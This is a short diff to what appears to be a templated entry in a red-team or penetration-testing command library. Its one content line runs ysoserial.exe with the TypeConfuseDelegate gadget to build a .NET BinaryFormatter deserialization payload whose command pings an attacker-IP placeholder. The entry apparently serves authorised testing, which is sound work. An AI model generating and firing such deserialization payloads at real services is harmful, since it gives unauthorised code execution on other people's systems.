@@ -7,5 +7,3 @@ metadata:
 
 content: |
   <%=$(esh variables/delivery_path_windows)%>\Release\ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "ping -n 5 <%=$(esh variables/attacker_ip)%>" -o <raw|base64>
-
-
